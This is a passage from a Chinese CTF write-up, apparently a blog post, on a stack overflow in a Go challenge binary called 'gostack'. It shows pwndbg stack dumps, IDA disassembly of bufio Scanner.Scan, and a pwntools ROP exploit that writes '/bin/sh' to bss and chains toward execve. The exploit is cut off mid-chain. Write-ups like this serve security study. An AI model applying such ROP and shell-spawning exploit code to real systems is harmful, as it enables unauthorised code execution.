—▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x49b080 ◂— cmp rsp, qword ptr [&lt;span class=&#34;type&#34;&gt;r14&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;type&#34;&gt;x10&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0198&lt;/span&gt;│&lt;span class=&#34;literal&#34;&gt;-068&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049ef8 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x10000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;34&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;a0│&lt;span class=&#34;literal&#34;&gt;-060&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f00 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000102000 ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;35&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;a8│&lt;span class=&#34;literal&#34;&gt;-058&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f08 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x24 /* &lt;span class=&#34;string&#34;&gt;&amp;#x27;$&amp;#x27;&lt;/span&gt; */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;36&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;b0│&lt;span class=&#34;literal&#34;&gt;-050&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f10 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x1000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;37&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;b8│&lt;span class=&#34;literal&#34;&gt;-048&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f18 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000102000 ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;38&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;c0│&lt;span class=&#34;literal&#34;&gt;-040&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f20 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x1000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;39&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;c8│&lt;span class=&#34;literal&#34;&gt;-038&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f28 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x1000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;a:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;d0│&lt;span class=&#34;literal&#34;&gt;-030&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f30 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x25 /* &lt;span class=&#34;string&#34;&gt;&amp;#x27;%&amp;#x27;&lt;/span&gt; */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;b:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;d8│&lt;span class=&#34;literal&#34;&gt;-028&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f38 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x25 /* &lt;span class=&#34;string&#34;&gt;&amp;#x27;%&amp;#x27;&lt;/span&gt; */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;c:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;e0│&lt;span class=&#34;literal&#34;&gt;-020&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f40 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓          &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; skipped&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;f:&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;f8│&lt;span class=&#34;literal&#34;&gt;-008&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f58 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0200&lt;/span&gt;│ &lt;span class=&#34;built_in&#34;&gt;rbp&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f60 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049f70 —▸ &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xc000049fd0 ◂— &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;能清晰地看到，rbp与缓冲区的大小：&lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; distance &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xf60 &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xd98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xf60-&amp;gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;xd98 is &lt;span class=&#34;literal&#34;&gt;-0x1c8&lt;/span&gt; bytes (&lt;span class=&#34;literal&#34;&gt;-0x39&lt;/span&gt; words)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;那么，之后就可以直接进行栈溢出了。但是，在经过多次溢出之后，发现了个致命的问题，就是关于这个输入函数，致命在哪里呢？在这儿：&lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;000000000049&lt;/span&gt;A786                 cmp     byte ptr [&lt;span class=&#34;type&#34;&gt;rax&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;79&lt;/span&gt;&lt;span class=&#34;type&#34;&gt;h&lt;/span&gt;], &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;000000000049&lt;/span&gt;A78A                 jnz     short loc_49A79A&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;以及：&lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;000000000049&lt;/span&gt;A79A loc_49A79A:                             ; CODE XREF: bufio__ptr_Scanner_Scan+&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;A↑j&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;000000000049&lt;/span&gt;A79A                 xor     eax, eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;000000000049&lt;/span&gt;A79C                 mov     &lt;span class=&#34;built_in&#34;&gt;rbp&lt;/span&gt;, [&lt;span class=&#34;type&#34;&gt;rsp&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;type&#34;&gt;D0h&lt;/span&gt;+&lt;span class=&#34;type&#34;&gt;var_8&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;000000000049&lt;/span&gt;A7A4                 add     rsp, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;D0&lt;span class=&#34;built_in&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;000000000049&lt;/span&gt;A7AB                 retn&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;它会对这儿进行一次比对，如果是0，则不会跳转，如果不是0，则会跳转，直接停止输入的函数。&lt;br&gt;所以需要直接用\x00来填充是最保险的。之后就是syscall来打，但是exp我不是很会写，先借鉴借鉴大佬们的，之后再看看：&lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# context.log_level = &amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = &lt;span class=&#34;keyword&#34;&gt;process&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./gostack&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# io = remote(&amp;#x27;8.147.133.63&amp;#x27;,  34196)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&lt;span class=&#34;string&#34;&gt;&amp;#x27;magic message :&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bss = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x000000000563C50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;syscall_addr = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x0000000000404043&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rsi = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x000000000042138a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rax = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x000000000040f984&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdx = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x00000000004944ec&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x00000000004a18a5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leave_ret = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x000000000049695a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# write &amp;#x27;/bin/sh\x00&amp;#x27; to bss&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop = p64(pop_rax)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(pop_rsi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(bss)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(pop_rdx)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(pop_rdi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(syscall_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(syscall_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(syscall_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(syscall_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(syscall_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(syscall_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# execve(&amp;#x27;/bin/sh&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(pop_rax)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;x3b)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(pop_rsi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop += p64(pop_rdx)&lt;/sp